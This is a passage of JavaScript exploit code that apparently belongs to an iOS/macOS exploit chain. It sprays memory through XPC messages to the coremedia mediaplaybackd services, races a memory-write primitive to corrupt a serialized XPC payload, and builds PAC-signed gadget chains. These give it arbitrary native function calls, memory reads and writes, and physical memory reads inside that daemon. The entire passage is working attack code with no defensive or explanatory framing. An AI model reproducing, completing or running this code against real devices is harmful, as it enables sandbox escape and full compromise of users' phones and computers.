    LOG(`destination_surface_address: ${sbx1sbx1_ctx.destination_surface_address.hex()}`);
    LOG(`destination_surface_size: ${sbx1sbx1_ctx.destination_surface_size.hex()}`);
    let test = calloc(1n, 8n);
    uwrite64(test, 0xbabababababababan);
    sbx1sbx1_exp_write_prepare(sbx1sbx1_ctx, test, 8n);
    sbx1sbx1_exp_write_perform(sbx1sbx1_ctx);
    let key_hdr_sz = 0x28n;
    let big_key_size = PAGE_SIZE * 8n - key_hdr_sz;
    let small_key_size = PAGE_SIZE * 4n - key_hdr_sz;
    let random_key_size = PAGE_SIZE * 1n - key_hdr_sz;
    let big_key = calloc(1n, big_key_size);
    let small_key = calloc(1n, small_key_size);
    let random_key = calloc(1n, random_key_size);
    memset(big_key, 0x41n, big_key_size - 1n);
    memset(small_key, 0x42n, small_key_size - 1n);
    memset(random_key, 0x43n, random_key_size - 1n);
    let o = oxpc_dictionary_alloc();
    let null_o = oxpc_null_alloc();
    oxpc_dictionary_append(o, big_key, null_o);
    uwrite8(big_key, uread8(big_key) + 0x1);
    for (let i = 0n; i < 4n; i++) {
      oxpc_dictionary_append(o, small_key, null_o);
      uwrite8(small_key, uread8(small_key) + 0x1);
    }
    oxpc_dictionary_append(o, big_key, null_o);
    oxpc_dictionary_append(o, random_key, null_o);
    free(big_key);
    free(small_key);
    free(random_key);
    let port_ptr = new_uint64_t();
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, port_ptr);
    let port = uread32(port_ptr);
    mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
    let payload = oxpc_object_serialize_with_header(o);
    let port_list = payload["ports"];
    let serialized_payload_size = payload["total_size"];
    let serialized_payload = payload["buffer"];
    oxpc_port_list_append(port_list, port);
    let magic_ptr = new_uint64_t(0x41414142n);
    let start_of_target_string = memmem(serialized_payload, serialized_payload_size, magic_ptr, 0x4n);
    assert(start_of_target_string != NULL, "Failed to find target string");
    uwrite8(start_of_target_string, 0x41);
    let end_of_target_string = start_of_target_string + big_key_size;
    let end_of_target_string_page = trunc_page(end_of_target_string);
    let ool_string_offset = start_of_target_string - serialized_payload;
    let target_offset = end_of_target_string - end_of_target_string_page - 1n;
    LOG("end_of_target_string_page: " + end_of_target_string_page.hex());
    LOG("target_offset: " + target_offset.hex());
    let original_ool_page = calloc(1n, PAGE_SIZE);
    memcpy(original_ool_page, end_of_target_string_page, PAGE_SIZE);
    let tmp_ptr = new_uint64_t(end_of_target_string_page);
    let cur_protection_ptr = new_uint64_t(VM_PROT_DEFAULT);
    let max_protection_ptr = new_uint64_t(VM_PROT_DEFAULT);
    kr = mach_vm_remap(mach_task_self(), tmp_ptr, PAGE_SIZE, 0n, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, mach_task_self(), sbx1sbx1_ctx.destination_surface_address + MAX_TRANSFER_BYTES, 1n, cur_protection_ptr, max_protection_ptr, VM_INHERIT_NONE);
    assert(kr == KERN_SUCCESS);
    sbx1sbx1_exp_write_prepare_and_perform(sbx1sbx1_ctx, original_ool_page, PAGE_SIZE);
    let buffer_size = 16n + 1n;
    let original_buffer = calloc(1n, buffer_size);
    memcpy(original_buffer, original_ool_page + target_offset, buffer_size);
    let modified_buffer = calloc(1n, buffer_size);
    uwrite8(modified_buffer, 0x41);
    uwrite64(modified_buffer + 1n, 0xbabababababababan);
    let n_of_current_exp_write_threads = 1n;
    let n_of_exp_write_threads = get_ncpu();
    let exp_write_threads = [];
    LOG(`Using ${n_of_exp_write_threads} EXP target threads for this configuration.`);
    for (let i = 0n; i < n_of_exp_write_threads; i++) {
      exp_write_threads[i] = sbx1sbx1_exp_write_thread_setup(sbx1sbx1_ctx, buffer_size, original_buffer, modified_buffer, target_offset);
    }
    let success = false;
    let services = ["com.apple.coremedia.mediaplaybackd.asset.xpc", "com.apple.coremedia.mediaplaybackd.assetimagegenerator.xpc", "com.apple.coremedia.mediaplaybackd.cpe.xpc", "com.apple.coremedia.mediaplaybackd.cpeprotector.xpc", "com.apple.coremedia.mediaplaybackd.figcontentkeyboss.xpc", "com.apple.coremedia.mediaplaybackd.figcontentkeysession.xpc", "com.apple.coremedia.mediaplaybackd.figcpecryptor.xpc", "com.apple.coremedia.mediaplaybackd.figmetriceventtimeline.xpc", "com.apple.coremedia.mediaplaybackd.formatreader.xpc", "com.apple.coremedia.mediaplaybackd.visualcontext.xpc"];
    let services_idx = 0n;
    set_realtime_priority(gpu_fcall(PTHREAD_SELF), 0, 50, 50);
    pthread_yield_np(pthread_self());
    for (let attempt = 0n; attempt < 8n; attempt++) {
      if (services_idx >= services.length) {
        break;
      }
      let TARGET_XPC_SERVICE = services[services_idx];
      let connection = xpcjs_xpc_connect(TARGET_XPC_SERVICE);
      if (connection == null) {
        LOG(`connection failed, retrying again with a different endpoint...`);
        continue;
      }
      LOG(`connected to ${TARGET_XPC_SERVICE}`);
      LOG(`connection client_port: ${connection["client_port"].hex()}`);
      LOG(`connection reply_port: ${connection["reply_port"].hex()}`);
      let test_msg = test_msg_create(connection);
      let message = oxpc_build_mach_message(serialized_payload, serialized_payload_size, 1n, port_list, connection["client_port"], connection["reply_port"]);
      let xpc_msg_size = message["message_size"];
      let xpc_msg = message["message"];
      let mach_msg_option = MACH_SEND_MSG | MACH_SEND_TIMEOUT;
      let mach_msg_send_size = xpc_msg_size;
      let mach_msg_rcv_size = xpc_msg_size + PAGE_SIZE;
      let mach_msg_rcv_name = connection["reply_port"];
      spray_guess_address(spray_memory_object, surface);
      uwrite64(modified_buffer + 1n + 8n, guess_address + 0x110n);
      let n_of_max_exp_attempts = 8192n;
      let yield_threshold = 256n;
      for (let exp_attempt = 0n; exp_attempt < n_of_max_exp_attempts; exp_attempt++) {
        thread_group_unlock(exp_write_threads, n_of_current_exp_write_threads);
        kr = mach_msg(xpc_msg, mach_msg_option, mach_msg_send_size, 0n, 0n, 15n, MACH_PORT_NULL);
        if (kr != MACH_SEND_TIMED_OUT) {
          if (kr != KERN_SUCCESS) {
            LOG(`[!] Unexpected return code from mach_msg: ${kr.hex()} for exp_attempt: ${exp_attempt}, retrying...`);
            services_idx++;
            thread_group_lock(exp_write_threads, n_of_current_exp_write_threads);
            break;
          }
          if (exp_attempt != 0n && exp_attempt % yield_threshold == 0n) {
            thread_group_lock(exp_write_threads, n_of_current_exp_write_threads);
            LOG("Yielding...");
            pthread_yield_np(pthread_self());
            thread_group_unlock(exp_write_threads, n_of_current_exp_write_threads);
          }
          if (exp_attempt > n_of_max_exp_attempts - 32n) {
            LOG(`too many attempts, exp_attempt: ${exp_attempt}...`);
            thread_group_lock(exp_write_threads, n_of_current_exp_write_threads);
            return false;
          }
          thread_group_lock(exp_write_threads, n_of_current_exp_write_threads);
          n_of_current_exp_write_threads = (n_of_current_exp_write_threads + 1n) % n_of_exp_write_threads;
          if (n_of_current_exp_write_threads == 0n) {
            n_of_current_exp_write_threads = 1n;
          }
          continue;
        }
        thread_group_lock(exp_write_threads, n_of_current_exp_write_threads);
        LOG(`Likely successful EXP bypass attempt (#${exp_attempt}), checking...`);
        kr = mach_msg(test_msg.msg, MACH_SEND_MSG | MACH_SEND_TIMEOUT | MACH_RCV_MSG | MACH_RCV_TIMEOUT, test_msg.msg_size, test_msg.msg_size + PAGE_SIZE, connection["reply_port"], 15n, MACH_PORT_NULL);
        if (kr != MACH_SEND_TIMED_OUT) {
          LOG("[x] Error: Daemon likely crashed, retrying...");
          break;
        }
        success = true;
        break;
      }
      let alive = false;
      if (success) {
        while (true) {
          surface_address_remote = uread64(surface_address + 0x8n);
          if (surface_address_remote != 0n) {
            break;
          }
        }
        LOG(`surface_address_remote: ${surface_address_remote.hex()}`);
        setup_nativefcall_fcall();
        {
          LOG("[i] nativefcall setup done...");
          lazy_fcall("usleep", 5n * 1000n);
          mpd_fcall_noreturn(CALLOC, 0x100n, 1n, 0n, 0n, 0n, 0n, 0n, 0n);
          while (true) {
            let interval = Date.now();
            let test_msg = test_msg_create(connection);
            kr = mach_msg(test_msg.msg, MACH_SEND_MSG | MACH_SEND_TIMEOUT | MACH_RCV_MSG | MACH_RCV_TIMEOUT, test_msg.msg_size, test_msg.msg_size + PAGE_SIZE, connection["reply_port"], 1n, MACH_PORT_NULL);
            interval = Date.now() - interval;
            LOG(`msg took: ${interval} ms`);
            if (kr == MACH_SEND_TIMED_OUT) {
              if (mpd_fcall_check_for_return() == false) {
                continue;
              }
              LOG(`[i] calloc() survived !!!`);
              alive = true;
              break;
            } else {
              LOG(`[!] calloc() crashed ${kr.hex()} !!! Probably wrong malloc_zones guess address !!!`);
              services_idx = 0n;
              alive = false;
              break;
            }
          }
        }

        //mach_port_deallocate(mach_task_self(), connection["reply_port"]);
        mach_port_deallocate(mach_task_self(), connection["client_port"]);

        if (alive) {
          break;
        }
      }
    }
    if (success == false) {
      LOG("[x] Error: Reached maximum number of attempts, aborting...");
      return false;
    }
    LOG("done");
    return true;
  }
  function mpd_fcall_check_for_return() {
    let final_fcall_buf_local = surface_address + 0x400n;
    let mpd_fcall_retval_ptr = final_fcall_buf_local + 0x28n;
    let r = uread64(mpd_fcall_retval_ptr);
    if (r != 0xcafedeadn) {
      return true;
    } else {
      return false;
    }
  }
  const MPD_FCALL_TIMED_OUT = 1n;
  const MPD_FCALL_DEFAULT_TIMEOUT = 3000n;
  const MPD_FCALL_QUICK_TIMEOUT = 1000n;
  function mpd_fcall_internal(address, x0, x1, x2, x3, x4, x5, x6, x7, noreturn, do_exit = false, timeout = false, timeout_ms = MPD_FCALL_DEFAULT_TIMEOUT) {
    let nativefcall_buf_local = surface_address + 0x100n;
    let final_fcall_buf_local = surface_address + 0x400n;
    let final_fcall_args_local = surface_address + 0x500n;
    let final_fcall_buf_remote = surface_address_remote + 0x400n;
    let final_fcall_args_remote = surface_address_remote + 0x500n;
    uwrite64(final_fcall_args_local + 0n * 0x8n, x0);
    uwrite64(final_fcall_args_local + 1n * 0x8n, x1);
    uwrite64(final_fcall_args_local + 2n * 0x8n, x2);
    uwrite64(final_fcall_args_local + 3n * 0x8n, x3);
    uwrite64(final_fcall_args_local + 4n * 0x8n, x4);
    uwrite64(final_fcall_args_local + 5n * 0x8n, x5);
    uwrite64(final_fcall_args_local + 6n * 0x8n, x6);
    uwrite64(final_fcall_args_local + 7n * 0x8n, x7);
    let mpd_fcall_retval_ptr = final_fcall_buf_local + 0x28n;
    uwrite64(mpd_fcall_retval_ptr, 0xcafedeadn);
    nativefcall_insert_fcall(final_fcall_buf_local, final_fcall_buf_remote, address, final_fcall_args_remote, true);
    uwrite64(nativefcall_buf_local, pacia(_4_fcalls + 12n * 4n, 0n));
    if (noreturn) {
      return;
    }
    let start = Date.now();
    while (uread64(mpd_fcall_retval_ptr) == 0xcafedeadn) {
      if (timeout) {
        let interval = Date.now() - start;
        if (interval > timeout_ms) {
          return MPD_FCALL_TIMED_OUT;
        }
      }
    }
    let return_value = uread64(mpd_fcall_retval_ptr);
    return return_value;
  }
  function mpd_fcall(address, x0 = 0n, x1 = 0n, x2 = 0n, x3 = 0n, x4 = 0n, x5 = 0n, x6 = 0n, x7 = 0n) {
    return mpd_fcall_internal(address, x0, x1, x2, x3, x4, x5, x6, x7, false);
  }
  function mpd_fcall_noreturn(address, x0 = 0n, x1 = 0n, x2 = 0n, x3 = 0n, x4 = 0n, x5 = 0n, x6 = 0n, x7 = 0n) {
    return mpd_fcall_internal(address, x0, x1, x2, x3, x4, x5, x6, x7, true);
  }
  function mpd_fcall_noreturn_exit(address, x0 = 0n, x1 = 0n, x2 = 0n, x3 = 0n, x4 = 0n, x5 = 0n, x6 = 0n, x7 = 0n) {
    return mpd_fcall_internal(address, x0, x1, x2, x3, x4, x5, x6, x7, true, true);
  }
  function mpd_fcall_timeout(address, x0 = 0n, x1 = 0n, x2 = 0n, x3 = 0n, x4 = 0n, x5 = 0n, x6 = 0n, x7 = 0n) {
    return mpd_fcall_internal(address, x0, x1, x2, x3, x4, x5, x6, x7, false, false, true, MPD_FCALL_DEFAULT_TIMEOUT);
  }
  function mpd_fcall_quick(address, x0 = 0n, x1 = 0n, x2 = 0n, x3 = 0n, x4 = 0n, x5 = 0n, x6 = 0n, x7 = 0n) {
    return mpd_fcall_internal(address, x0, x1, x2, x3, x4, x5, x6, x7, false, false, true, MPD_FCALL_QUICK_TIMEOUT);
  }
  function mpd_read64(address) {
    uwrite64(surface_address + 0x2100n, 0n);
    mpd_fcall(MEMCPY, surface_address_remote + 0x2100n, address, 8n, 0n, 0n, 0n, 0n, 0n);
    return uread64(surface_address + 0x2100n);
  }
  function mpd_write64(address, value) {
    uwrite64(surface_address + 0x2100n, value);
    mpd_fcall(MEMCPY, address, surface_address_remote + 0x2100n, 8n, 0n, 0n, 0n, 0n, 0n);
  }
  function mpd_write8(address, value) {
    uwrite8(surface_address + 0x2100n, value);
    mpd_fcall(MEMCPY, address, surface_address_remote + 0x2100n, 1n, 0n, 0n, 0n, 0n, 0n);
  }
  function mpd_read8(address) {
    uwrite8(surface_address + 0x2100n, 0n);
    mpd_fcall(MEMCPY, surface_address_remote + 0x2100n, address, 1n, 0n, 0n, 0n, 0n, 0n);
    return uread8(surface_address + 0x2100n);
  }
  function mpd_read64_timeout(address) {
    uwrite64(surface_address + 0x2100n, 0n);
    let ret = mpd_fcall_timeout(MEMCPY, surface_address_remote + 0x2100n, address, 8n, 0n, 0n, 0n, 0n, 0n);
    if (ret === MPD_FCALL_TIMED_OUT) {
      return MPD_FCALL_TIMED_OUT;
    }
    return uread64(surface_address + 0x2100n);
  }

  function mpd_read8_timeout(address) {
    uwrite8(surface_address + 0x2100n, 0n);
    let ret = mpd_fcall_timeout(MEMCPY, surface_address_remote + 0x2100n, address, 1n, 0n, 0n, 0n, 0n, 0n);
    if (ret === MPD_FCALL_TIMED_OUT) {
      return MPD_FCALL_TIMED_OUT;
    }
    return uread8(surface_address + 0x2100n);
  }
  function mpd_read32_timeout(address) {
    uwrite64(surface_address + 0x2100n, 0n);
    let ret = mpd_fcall_timeout(MEMCPY, surface_address_remote + 0x2100n, address, 4n, 0n, 0n, 0n, 0n, 0n);
    if (ret === MPD_FCALL_TIMED_OUT) {
      return MPD_FCALL_TIMED_OUT;
    }
    return uread64(surface_address + 0x2100n) & 0xFFFFFFFFn;
  }
  function mpd_read32(address) {
    uwrite64(surface_address + 0x2100n, 0n);
    mpd_fcall(MEMCPY, surface_address_remote + 0x2100n, address, 4n, 0n, 0n, 0n, 0n, 0n);
    return uread64(surface_address + 0x2100n) & 0xFFFFFFFFn;
  }
  function mpd_write64_timeout(address, value) {
    uwrite64(surface_address + 0x2100n, value);
    return mpd_fcall_timeout(MEMCPY, address, surface_address_remote + 0x2100n, 8n, 0n, 0n, 0n, 0n, 0n);
  }
  function mpd_write8_timeout(address, value) {
    uwrite8(surface_address + 0x2100n, value);
    return mpd_fcall_timeout(MEMCPY, address, surface_address_remote + 0x2100n, 1n, 0n, 0n, 0n, 0n, 0n);
  }

  // Function to read physical memory via mach_vm_remap
  // Requires: globalThis.MEMORY_OBJECT_PORT and globalThis.PHYS_READ_VIA_REMAP
  function mpd_phys_read(phys_offset, size = 8n) {
    if (!globalThis.PHYS_READ_VIA_REMAP || !globalThis.MEMORY_OBJECT_PORT) {
      LOG("[phys] Cannot use mpd_phys_read — PHYS_READ_VIA_REMAP or MEMORY_OBJECT_PORT not available");
      return 0n;
    }

    try {
      // Use mach_vm_map (NOT mach_vm_remap) — remap needs x8-x10 as output
      // pointers which mpd_fcall can't pass. mach_vm_map with varying offset
      // achieves the same result and works with only x0-x7 (proven in 0B).
      let MPD_mach_vm_map = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "mach_vm_map");
      if (MPD_mach_vm_map.noPAC() == 0n) {
        LOG("[phys] mach_vm_map not available via gpuDlsym");
        return 0n;
      }

      let real_task_port = globalThis.MPD_TASK_PORT;
      if (!real_task_port || real_task_port == 0n) {
        LOG("[phys] No saved task port — cannot read physical memory");
        return 0n;
      }
      let remap_addr_buf = mpd_malloc(8n);
      mpd_write64(remap_addr_buf, 0n);

      // mach_vm_map(target_task, addr_ptr, size, mask, flags, object, offset, copy)
      // x0=target, x1=addr_ptr, x2=size, x3=mask, x4=flags, x5=object, x6=offset, x7=copy
      let remap_ret = mpd_fcall_timeout(MPD_mach_vm_map.noPAC(),
        real_task_port, remap_addr_buf, 0x1000n, 0n,
        VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR, globalThis.MEMORY_OBJECT_PORT, phys_offset,
        0n /*copy=FALSE*/);

      if (remap_ret != 0n) {
        LOG(`[phys] mach_vm_remap failed: ret=${remap_ret}`);
        return 0n;
      }

      let remap_addr = mpd_read64(remap_addr_buf);
      if (remap_addr == 0n) {
        LOG("[phys] mach_vm_remap succeeded but addr=0");
        return 0n;
      }

      // Read from the remapped page
      let value = 0n;
      if (size == 8n) {
        value = mpd_read64_timeout(remap_addr + (phys_offset & 0xFFFn)); // offset within page
      } else if (size == 1n) {
        value = mpd_read8(remap_addr + (phys_offset & 0xFFFn));
      } else {
        LOG(`[phys] Unsupported size: ${size}`);
      }

      if (value === MPD_FCALL_TIMED_OUT) {
        LOG(`[phys] Read from remapped page timed out`);
        value = 0n;
      }

      // TODO: Deallocate the remapped page (not critical, will be recycled)

      return value;
    } catch(e) {
      LOG(`[phys] mpd_phys_read error: ${e.message}`);
      return 0n;
    }
  }
  function round_down_power_of_two(n) {
    if (n < 1n) {
      return 0n;
    }
    let power = 1n;
    while (power <= n) {
      power <<= 1n;
    }
    return power >> 1n;
  }
  function get_event_handler_block() {
    let event_handler_block = calloc(1n, 0x100n);
    uwrite64(event_handler_block + 8n * 1n, 0x50000000n);
    let event_handler_block_impl = xpac(func_resolve("getpid"));
    let event_handler_block_impl_addr = event_handler_block + 0x10n;
    let event_handler_block_impl_sign = pacia(event_handler_block_impl, event_handler_block_impl_addr);
    uwrite64(event_handler_block_impl_addr, event_handler_block_impl_sign);
    return event_handler_block;
  }
  function nativefcall_insert_fcall(x0_local, x0_remote, pc, args, get_return_value) {
    let target_pc = 0n;
    let load_x1x3x8_args_local = 0n;
    let load_x1x3x8_args_remote = 0n;
    if (get_return_value) {
      load_x1x3x8_args_local = x0_local + 0x40n;
      load_x1x3x8_args_remote = x0_remote + 0x40n;
      uwrite64(x0_local + 0x0n, load_x1x3x8_args_remote);
      uwrite64(x0_local + 0x8n, pacia(load_x1x3x8, 0n));
      target_pc = _CFObjectCopyProperty;
    } else {
      load_x1x3x8_args_local = x0_local;
      load_x1x3x8_args_remote = x0_remote;
      target_pc = load_x1x3x8;
    }
    uwrite64(load_x1x3x8_args_local + 0x20n, load_x1x3x8_args_remote + 0x40n);
    uwrite64(load_x1x3x8_args_local + 0x28n, args - 0x10n);
    uwrite64(load_x1x3x8_args_local + 0x30n, pacia(pc.noPAC(), 0xC2D0n));
    uwrite64(load_x1x3x8_args_local + 0x50n, pacia(fcall_14_args_write_x8, load_x1x3x8_args_remote + 0x50n));
    return target_pc;
  }
  function setup_nativefcall(surface, x0_local, x0_remote) {
    let surface_id = IOSurfaceGetID(surface);
    let surface_address = IOSurfaceGetBaseAddress(surface);
    LOG(`surface_address: ${surface_address.hex()}`);
    LOG(`surface_id: ${surface_id.hex()}`);
    let first_fcall_args_local = x0_local + 0x100n;
    let lookup_surface_buf_local = x0_local + 0x200n;
    let lookup_surface_args_local = x0_local + 0x300n;
    let first_fcall_args_remote = x0_remote + 0x100n;
    let lookup_surface_buf_remote = x0_remote + 0x200n;
    let lookup_surface_args_remote = x0_remote + 0x300n;
    uwrite64(lookup_surface_args_local, surface_id);
    let lookup_wrapper_pc = nativefcall_insert_fcall(lookup_surface_buf_local, lookup_surface_buf_remote, func_resolve("IOSurfaceLookup").noPAC(), lookup_surface_args_remote, false);
    uwrite64(first_fcall_args_local, lookup_surface_buf_remote);
    uwrite64(first_fcall_args_local + 0x18n, pacia(lookup_wrapper_pc, 0x4EB9n));
    uwrite64(first_fcall_args_local + 0x20n, pacia(func_resolve("IOSurfaceGetBaseAddress").noPAC(), 0x76DFn));
    uwrite64(first_fcall_args_local + 0x28n, pacia(store_x0_x0, 0x1558n));
    uwrite64(first_fcall_args_local + 0x30n, pacia(self_loop, 0x4F6Bn));
    uwrite64(surface_address, pacia(self_loop, 0n));
    let first_fcall_pc = nativefcall_insert_fcall(x0_local, x0_remote, _4_fcalls, first_fcall_args_remote, false);
    uwrite64(x0_local + 0x10n, pacia(first_fcall_pc, x0_remote + 0x10n));
  }
  function setup_nativefcall_fcall() {
    let nativefcall_buf_local = surface_address + 0x100n;
    let nativefcall_args_local = surface_address + 0x200n;
    let nativefcall_fcall_buf_local = surface_address + 0x300n;
    let final_fcall_buf_local = surface_address + 0x400n;
    let final_fcall_args_local = surface_address + 0x500n;
    let nativefcall_buf_remote = surface_address_remote + 0x100n;
    let nativefcall_args_remote = surface_address_remote + 0x200n;
    let nativefcall_fcall_buf_remote = surface_address_remote + 0x300n;
    let final_fcall_buf_remote = surface_address_remote + 0x400n;
    let final_fcall_args_remote = surface_address_remote + 0x500n;
    let init_fcall = nativefcall_insert_fcall(surface_address, surface_address_remote, _4_fcalls, nativefcall_args_remote, false);
    let nativefcall_fcall_wrapper_pc = nativefcall_insert_fcall(nativefcall_buf_local, nativefcall_buf_remote, _4_fcalls, nativefcall_fcall_buf_remote, false);
    uwrite64(nativefcall_args_local, nativefcall_buf_remote);
    uwrite64(nativefcall_args_local + 0x18n, pacia(store_x0_x0 + 4n, 0x4EB9n));
    uwrite64(nativefcall_args_local + 0x20n, pacia(nativefcall_fcall_wrapper_pc, 0x76DFn));
    uwrite64(nativefcall_args_local + 0x28n, pacia(mov_x0_x22, 0x1558n));
    uwrite64(nativefcall_args_local + 0x30n, pacia(self_loop, 0x4F6Bn));
    let final_fcall_wrapper_pc = nativefcall_insert_fcall(final_fcall_buf_local, final_fcall_buf_remote, func_resolve("getpid").noPAC(), final_fcall_args_remote, true);
    uwrite64(nativefcall_fcall_buf_local, final_fcall_buf_remote);
    uwrite64(nativefcall_fcall_buf_local + 0x8n, pacia(self_loop, 0n));
    uwrite64(nativefcall_fcall_buf_local + 0x10n, nativefcall_buf_remote);
    uwrite64(nativefcall_fcall_buf_local + 0x18n, pacia(add_x22_0x90, 0x4EB9n));
    uwrite64(nativefcall_fcall_buf_local + 0x20n, pacia(str_x1_x2, 0x76DFn));
    uwrite64(nativefcall_fcall_buf_local + 0x28n, pacia(final_fcall_wrapper_pc, 0x1558n));
    uwrite64(nativefcall_fcall_buf_local + 0x30n, pacia(str_x1_x2 + 4n, 0x4F6Bn));
    uwrite64(final_fcall_buf_local + 0x28n, 0xcafedeadn);
    uwrite64(nativefcall_buf_local, pacia(self_loop, 0n));
    uwrite64(surface_address, pacia(init_fcall, 0n));
    while (uread64(final_fcall_buf_local + 0x28n) == 0xcafedeadn) {
      usleep(1n);
    }
  }
  function reset_nativefcall(surface, x0_remote) {
    uwrite64(surface_address, pacia(self_loop, 0n));
  }
  const guess_address = 0x122604000n;
  let nativefcall_remote = 0n;
  const spray_sz = 1024n * 1024n * 1024n / 4n - PAGE_SIZE;
  function setup_guess_address(surface) {
    let kr = KERN_SUCCESS;
    let spray_address_ptr = new_uint64_t();
    kr = mach_vm_allocate(mach_task_self(), spray_address_ptr, spray_sz, VM_FLAGS_ANYWHERE);
    let spray_address = uread64(spray_address_ptr);
    let guess_address_local = spray_address;
    let guess_address_remote = guess_address;
    guess_address_local += 0x110n;
    guess_address_remote += 0x110n;
    let malloc_zones = func_resolve("malloc_zones");
    let nano_zone = uread64(uread64(malloc_zones));
    let nano_zone_ptr = malloc_zones + 0x8n;
    while (true) {
      if (nano_zone == uread64(nano_zone_ptr)) {
        break;
      } else {
        nano_zone_ptr += 8n;
      }
    }
    LOG(`malloc_zones: ${malloc_zones.hex()}`);
    LOG(`nano_zone_ptr: ${nano_zone_ptr.hex()}`);
    let fake_obj_0 = guess_address_local;
    let fake_obj_1 = guess_address_local + 0x100n;
    let fake_malloc_zones = guess_address_local + 0x200n;
    let fake_obj_1_remote = guess_address_remote + 0x100n;
    let fake_malloc_zones_remote = guess_address_remote + 0x200n;
    uwrite64(fake_malloc_zones, fake_malloc_zones_remote);
    uwrite64(fake_malloc_zones + 0x68n, 0x1c000n);
    uwrite64(fake_malloc_zones + 0x90n, pacia(xpac(malloc_restore_0_gadget), 0xa9d9n));
    uwrite64(fake_obj_0 + 0x00n, fake_obj_1_remote);
    uwrite64(fake_obj_0 + 0x08n, 0n);
    uwrite64(fake_obj_0 + 0x18n, 2n);
    uwrite64(fake_obj_1 + 0x00n, fake_malloc_zones_remote);
    uwrite64(fake_obj_1 + 0x08n, malloc_zones);
    uwrite64(fake_obj_1 + 0x10n, 0x8000000000000000n);
    uwrite64(fake_obj_1 + 0x18n, 1n);
    let x0_local = fake_malloc_zones;
    let x0_remote = fake_malloc_zones_remote;
    uwrite64(x0_local + 48n, pacia(malloc_restore_1_gadget, 0n));
    uwrite64(x0_local + 56n, nano_zone_ptr - 0x8n);
    uwrite64(x0_local + 32n, x0_remote + 0x100n);
    x0_local = x0_local + 0x100n;
    x0_remote = x0_remote + 0x100n;
    uwrite64(x0_local + 0x10n, pacia(malloc_restore_2_gadget, x0_remote + 0x10n));
    uwrite64(x0_local + 32n, x0_remote + 0x20n);
    x0_local = x0_local + 0x20n;
    x0_remote = x0_remote + 0x20n;
    uwrite64(x0_local + 0x10n, pacia(malloc_restore_3_gadget, x0_remote + 0x10n));
    uwrite64(x0_local + 40n, malloc_zones);
    uwrite64(x0_local + 32n, x0_remote + 0x100n);
    x0_local = x0_local + 0x100n;
    x0_remote = x0_remote + 0x100n;
    nativefcall_remote = x0_remote;
    setup_nativefcall(surface, x0_local, nativefcall_remote);
    let lowest_power_of_two_size = round_down_power_of_two(spray_sz);
    for (let i = PAGE_SIZE; i < lowest_power_of_two_size; i *= 2n) {
      kr = mach_vm_copy(mach_task_self(), spray_address, i, spray_address + i);
      assert(kr == KERN_SUCCESS);
    }
    let remaining_size = spray_sz - lowest_power_of_two_size;
    if (remaining_size != 0n) {
      let remaining_copy_block_pages = 1n;
      let remaining_copy_block_size = remaining_copy_block_pages * PAGE_SIZE;
      for (let i = 0n; i < remaining_size; i += remaining_copy_block_size) {
        let dest_copy_addr = spray_address + lowest_power_of_two_size + i;
        kr = mach_vm_copy(mach_task_self(), spray_address, remaining_copy_block_size, dest_copy_addr);
        assert(kr == KERN_SUCCESS);
      }
    }
    let memory_object_ptr = calloc(1n, 8n);
    let memory_object_size_ptr = calloc(1n, 8n);
    uwrite64(memory_object_size_ptr, spray_sz);
    kr = mach_make_memory_entry_64(mach_task_self(), memory_object_size_ptr, spray_address, MAP_MEM_VM_SHARE | VM_PROT_DEFAULT, memory_object_ptr, MACH_PORT_NULL);
    assert(kr == KERN_SUCCESS);
    let memory_object_size = uread64(memory_object_size_ptr);
    assert(memory_object_size == spray_sz);
    let memory_object = uread64(memory_object_ptr);
    free(memory_object_size_ptr);
    free(memory_object_ptr);
    mach_vm_deallocate(mach_task_self(), spray_address, spray_sz);
    return memory_object;
  }
  function spray_guess_address(spray_memory_object, surface) {
    let kr = KERN_SUCCESS;
    let spray_address_ptr = new_uint64_t();
    kr = mach_vm_map(mach_task_self(), spray_address_ptr, spray_sz, 0n, VM_FLAGS_ANYWHERE, spray_memory_object, 0n, 1n, (VM_PROT_DEFAULT << 32n) + VM_PROT_DEFAULT, VM_INHERIT_NONE);
    assert(kr == KERN_SUCCESS);
    let spray_address = uread64(spray_address_ptr);
    reset_nativefcall(surface, nativefcall_remote);
    map_iosurface(surface);
    let endpoint_name = get_cstring("com.apple.coremedia.mediaplaybackd.sandboxserver.xpc");
    let block_impl = get_event_handler_block();
    let conn = xpc_connection_create_mach_service(endpoint_name, NULL, 0n);
    xpc_connection_set_event_handler(conn, block_impl);
    xpc_connection_activate(conn);
    let receivePort_ptr = new_uint64_t();
    kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, receivePort_ptr);
    let receivePort = uread32(receivePort_ptr);
    kr = mach_port_insert_right(mach_task_self(), receivePort, receivePort, MACH_MSG_TYPE_MAKE_SEND);
    let conn2 = xpc_connection_create_mach_service(endpoint_name, NULL, 0n);
    uwrite_bitsize(conn2 + 0x48n, receivePort, 32n);
    xpc_connection_set_event_handler(conn2, block_impl);
    xpc_connection_activate(conn2);
    let endpoint = xpc_endpoint_create(conn2);
    let msg = xpc_dictionary_create_empty();
    xpc_dictionary_set_uint64(msg, get_cstring(".Operation"), 0x2E6F7267n);
    xpc_dictionary_set_value(msg, get_cstring("MemoryOriginEndpoint"), endpoint);
    xpc_dictionary_set_uint64(msg, get_cstring("MemoryOriginServerToken"), 0x4242424243434343n);
    let ddata = dispatch_data_create(spray_address, spray_sz, 0n, block_impl);
    let data = xpc_data_create_with_dispatch_data(ddata);
    if (wc_strcmp(device_machine, wc_get_cstring("iPhone12,8")) == 0n || wc_strcmp(device_machine, wc_get_cstring("iPhone11,8")) == 0n) {
      xpc_dictionary_set_value(msg, get_cstring("spray"), data);
      xpc_dictionary_set_value(msg, get_cstring("spray2"), data);
    } else {
      xpc_dictionary_set_value(msg, get_cstring("spray"), data);
      xpc_dictionary_set_value(msg, get_cstring("spray2"), data);
      xpc_dictionary_set_value(msg, get_cstring("spray3"), data);
      xpc_dictionary_set_value(msg, get_cstring("spray4"), data);
    }
    xpc_release(data);
    LOG(`Sending message...`);
    xpc_connection_send_message_with_reply(conn, msg, NULL, block_impl);
    xpc_release(msg);
    xpc_connection_cancel(conn);
    xpc_connection_cancel(conn2);
    mach_vm_deallocate(mach_task_self(), spray_address, spray_sz);
